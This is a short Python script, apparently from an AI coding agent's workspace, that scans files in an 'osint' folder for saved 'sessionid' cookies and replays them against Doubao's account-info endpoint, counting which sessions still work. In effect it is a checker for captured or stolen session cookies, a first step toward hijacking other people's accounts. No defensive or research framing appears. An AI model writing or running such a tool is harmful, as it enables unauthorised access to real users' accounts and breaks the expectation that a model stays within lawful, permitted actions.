# -*- coding: utf-8 -*-
import glob, os, requests, json
BASE="https://www.doubao.com"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
paths = glob.glob(os.path.join(os.environ["CODEX_HOME"],"work","osint_r202","**","*.txt"), recursive=True)
cand=[p for p in paths if os.path.getsize(p)<200000 and "sessionid=" in open(p,encoding="utf-8",errors="replace").read(4000)]
print("candidates",len(cand))
def ckof(p):
    t=open(p,encoding="utf-8",errors="replace").read()
    d={}
    for part in t.replace("\n",";").split(";"):
        if "=" in part:
            k,v=part.split("=",1); d[k.strip()]=v.strip()
    return d
ok=0
for p in cand[:12]:
    d=ckof(p)
    if not d.get("sessionid"): continue
    s=requests.Session(); s.cookies.update(d)
    try:
        r=s.get("https://accounts.doubao.com/passport/account/info/v2/?aid=497858",
                headers={"user-agent":UA,"referer":BASE+"/"},timeout=15).json()
    except Exception as e:
        print(os.path.basename(p),"ERR",str(e)[:50]); continue
    print("%-42s code=%s uid=%s"%(os.path.basename(p)[:42],r.get("code"),(r.get("data") or {}).get("user_id_str")))
    if r.get("code")==0: ok+=1
print("valid doubao sessions:",ok)